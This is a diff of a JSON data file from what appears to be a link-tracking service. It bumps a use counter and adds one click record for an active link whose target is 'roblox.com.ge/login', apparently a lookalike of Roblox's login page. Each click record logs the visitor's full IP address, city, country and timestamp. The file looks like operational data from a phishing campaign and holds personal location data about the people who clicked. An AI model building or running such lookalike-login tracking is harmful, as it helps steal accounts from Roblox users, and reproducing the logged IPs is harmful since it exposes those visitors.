@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1394,
+    "useCount": 1395,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11320,6 +11320,14 @@
         "city": "Sosua, Cabarete",
         "flag": "🇩🇴",
         "countryCode": "DO"
+      },
+      {
+        "timestamp": 1777425787778,
+        "ip": "180.190.191.208",
+        "country": "Philippines",
+        "city": "Lahug",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
